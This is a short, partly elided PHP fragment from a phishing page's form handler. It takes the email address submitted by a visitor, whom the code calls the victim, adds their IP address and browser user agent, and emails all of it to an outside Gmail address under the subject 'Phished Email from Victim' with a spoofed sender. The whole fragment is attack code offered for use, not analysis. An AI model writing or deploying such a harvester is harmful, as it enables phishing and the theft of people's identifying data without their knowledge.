...
if ($_SERVER["REQUEST_METHOD"] == "POST") {  
 ...
 $data = [
   ...
   $victim_email = $_POST["email"];
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$subject = "Phished Email from Victim";
$message = "Email: $victim_email\nIP: $ip\nUser-Agent: $ua";
$headers = "From: no-reply@fake.com";

mail("hugheskira294@gmail.com", $subject, $message, $headers);
